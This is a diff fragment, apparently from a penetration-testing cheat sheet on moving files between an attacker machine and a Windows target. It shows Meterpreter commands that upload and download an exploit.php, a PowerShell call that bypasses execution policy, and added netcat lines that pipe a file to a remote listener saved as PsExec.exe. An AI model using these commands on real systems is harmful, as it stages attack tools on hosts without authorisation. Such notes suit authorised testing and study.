@@ -56,7 +56,13 @@ powershell.exe -ExecutionPolicy Bypass -Nologo -NonInteractive -NoProfile -File 
 - use meterpreter:
 	+ meterpreter > upload /var/www/html/exploit.php c:\\Users\IEUser\exploit.php
 	+ meterpreter > download c:\\Users\\IEUser\\exploit.php /var/www/exploit.php
+>Netcat
 
+#On sending machine
+nc -w 3 [destination] 1234 < send.file
+
+#on receiving end:
+cmd /c nc.exe -l -v -p 1234 > PsExec.exe
 
 
 
